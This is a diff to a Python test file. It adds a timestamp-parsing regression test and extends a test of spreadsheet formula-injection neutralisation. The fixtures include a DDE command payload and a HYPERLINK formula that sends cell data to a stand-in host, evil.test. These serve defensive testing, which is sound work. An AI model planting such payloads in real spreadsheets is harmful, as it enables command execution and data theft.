@@ -97,6 +97,33 @@ def test_parse_timestamp_rejects_double_zulu() -> None:
     )
 
 
+def test_parse_timestamp_matrix_keeps_real_year() -> None:
+    # Permanent regression of the A1 audit matrix: a spread of well-formed pinned
+    # timestamps (Zulu, explicit offsets, microseconds, naive, date-only, extreme
+    # years) must each parse to its real year, never the 1980 ZIP-epoch the old silent
+    # fallback produced; impossible or empty values must raise.
+    from modules.output_forge import OutputForgeError, _parse_timestamp
+
+    valid_years = {
+        "2026-06-08T00:00:00Z": 2026,
+        "2026-06-08T00:00:00z": 2026,
+        "2026-06-08T12:00:00+01:00": 2026,
+        "2026-06-08T12:00:00-05:00": 2026,
+        "2026-06-08T00:00:00.123456Z": 2026,
+        "2026-06-08T00:00:00": 2026,
+        "2026-06-08": 2026,
+        "0001-01-01T00:00:00Z": 1,
+        "9999-12-31T23:59:59Z": 9999,
+    }
+    for text, year in valid_years.items():
+        parsed = _parse_timestamp(text)
+        assert parsed.year == year, f"{text!r} parsed to year {parsed.year}, not {year}"
+
+    for bad in ("2026-13-08T00:00:00Z", "2026-06-32T00:00:00Z", "garbage", "", "   "):
+        with pytest.raises(OutputForgeError):
+            _parse_timestamp(bad)
+
+
 def test_xlsx_core_dates_pinned_not_1980(tmp_path: Path) -> None:
     # End-to-end guard for A1: with a 'Z'-suffixed pinned timestamp, the rendered
     # workbook's core.xml dates must be the pinned 2026 date, not the 1980 fallback.
@@ -498,7 +525,17 @@ def test_safe_cell_neutralises_formula_leaders() -> None:
     # prefixed so Excel reads it as text; a clean string and a number pass through.
     from modules.output_forge.dashboard_xlsx import _safe_cell
 
-    for payload in ("=1+2", "=cmd|'/c calc'!A1", "+1", "-1", "@SUM(1)", "\t=1"):
+    for payload in (
+        "=1+2",
+        "=cmd|'/c calc'!A1",
+        '=HYPERLINK("http://evil.test?x="&A1,"click")',
+        "+1",
+        "-1",
+        "@SUM(1)",
+        "\t=1",
+        "\r=1",
+        "\n=1",
+    ):
         assert _safe_cell(payload) == "'" + payload
     assert _safe_cell("running shoes") == "running shoes"
     assert _safe_cell(168000) == 168000
